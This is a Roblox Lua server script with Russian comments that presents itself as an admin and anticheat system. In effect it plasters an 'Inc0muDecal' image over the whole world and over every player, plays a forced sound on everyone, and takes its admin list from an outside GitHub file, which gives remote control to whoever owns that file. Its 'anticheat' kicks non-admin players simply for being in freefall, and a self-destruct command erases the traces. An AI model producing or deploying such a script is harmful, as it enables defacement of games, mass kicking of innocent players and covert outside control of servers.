----- СЕРВЕРНАЯ ЧАСТЬ -----
-- Server.lua
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Debris = game:GetService("Debris")

-- Проверка серверного контекста
if not RunService:IsServer() then
    warn("Серверный скрипт запущен на клиенте!")
    return
end

-- Создание удаленных событий
local ServerEvents = Instance.new("RemoteEvent")
ServerEvents.Name = "ServerEvents"
ServerEvents.Parent = ReplicatedStorage

-- Загрузка списка администраторов с GitHub
local function LoadAdminList()
    local success, response = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/iris-fecokev/My-Roblox-Script/main/admins.txt")
    end)
    
    if success and response then
        local admins = {}
        for line in response:gmatch("[^\r\n]+") do
            admins[line:lower()] = true
        end
        return admins
    end
    
    return {["yourusername"] = true} -- Fallback
end

-- Основные функции сервера
local function ApplyDecals(decalId)
    decalId = tonumber(decalId) or 1365169983
    
    -- Применение декалов к объектам мира
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and not obj:FindFirstChild("Inc0muDecal") then
            local decal = Instance.new("Decal")
            decal.Name = "Inc0muDecal"
            decal.Texture = "rbxassetid://"..tostring(decalId)
            decal.Face = Enum.NormalId.Top
            decal.Parent = obj
        end
    end
    
    -- Применение декалов к игрокам
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character then
            for _, part in ipairs(player.Character:GetDescendants()) do
                if part:IsA("BasePart") and not part:FindFirstChild("Inc0muDecal") then
                    local decal = Instance.new("Decal")
                    decal.Name = "Inc0muDecal"
                    decal.Texture = "rbxassetid://"..tostring(decalId)
                    decal.Face = Enum.NormalId.Front
                    decal.Parent = part
                end
            end
        end
    end
end

local function PlaySound(soundId)
    soundId = tonumber(soundId) or 3469045940
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character then
            local head = player.Character:FindFirstChild("Head")
            if head then
                -- Удаляем старые звуки
                for _, sound in ipairs(head:GetChildren()) do
                    if sound:IsA("Sound") then
                        sound:Stop()
                        Debris:AddItem(sound, 1)
                    end
                end
                
                -- Создаем новый звук
                local sound = Instance.new("Sound")
                sound.SoundId = "rbxassetid://"..tostring(soundId)
                sound.Volume = 1
                sound.Parent = head
                sound:Play()
                Debris:AddItem(sound, 30)
            end
        end
    end
end

local function BanCheaters()
    local admins = LoadAdminList()
    
    for _, player in ipairs(Players:GetPlayers()) do
        if not admins[player.Name:lower()] then
            local char = player.Character
            if char then
                local root = char:FindFirstChild("HumanoidRootPart")
                if root then
                    -- Проверка на летание
                    local humanoid = char:FindFirstChild("Humanoid")
                    if humanoid then
                        local state = humanoid:GetState()
                        if state == Enum.HumanoidStateType.Freefall or state == Enum.HumanoidStateType.Flying then
                            player:Kick("🔒 Античит: Обнаружен Fly Hack")
                        end
                    end
                    
                    -- Проверка на скорость
                    if root.Velocity.Magnitude > 150 then
                        player:Kick("🔒 Античит: Обнаружен Speed Hack")
                    end
                    
                    -- Проверка на вращение
                    if root.RotVelocity.Magnitude > 50 then
                        player:Kick("🔒 Античит: Обнаружен Spin Hack")
                    end
                end
            end
        end
    end
end

local function SelfDestruct()
    -- Удаляем все созданные объекты
    for _, obj in ipairs(ReplicatedStorage:GetChildren()) do
        if obj.Name == "ServerEvents" then
            obj:Destroy()
        end
    end
    
    -- Удаляем декалы
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj.Name == "Inc0muDecal" then
            obj:Destroy()
        end
    end
    
    -- Удаляем скрипт
    script:Destroy()
end

-- Обработчик команд
ServerEvents.OnServerEvent:Connect(function(player, command, ...)
    local args = {...}
    local admins = LoadAdminList()
    local isAdmin = admins[player.Name:lower()] or false
    
    -- Команды, доступные всем
    if command == "PlaySound" then
        PlaySound(args[1])
        return
    end
    
    -- Только для администраторов
    if not isAdmin then
        warn(player.Name.." попытался выполнить админ-команду без прав: "..command)
        return
    end
    
    if command == "ApplyDecals" then
        ApplyDecals(args[1])
    elseif command == "BanCheaters" then
        BanCheaters()
    elseif command == "SelfDestruct" then
        SelfDestruct()
    end
end)

-- Автозапуск эффектов при старте сервера
task.spawn(function()
    wait(5) -- Даем время игрокам подключиться
    
    -- Применяем декалы
    ApplyDecals(1365169983)
    
    -- Проигрываем звук
    PlaySound(3469045940)
    
    -- Запускаем античит
    while true do
        wait(10)
        BanCheaters()
    end
end)

print("⚡ Серверная система активирована")
